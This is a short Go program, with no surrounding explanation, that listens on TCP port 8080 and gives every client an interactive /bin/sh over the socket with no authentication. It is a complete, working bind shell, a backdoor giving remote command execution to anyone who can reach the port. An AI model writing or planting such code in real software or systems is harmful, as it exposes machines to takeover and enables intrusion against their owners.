package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	l, err := net.Listen("tcp", ":8080")

	if err != nil {
		log.Fatal(err)
	}

	for {
		conn, err := l.Accept()

		if err != nil {
			log.Fatal(err)
		}

		go handle(conn)
	}
}

func handle(conn net.Conn) {
	defer conn.Close()

	cmd := exec.Command("/bin/sh", "-i")

	pr, pw := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = pw

	go io.Copy(conn, pr)

	cmd.Run()
}
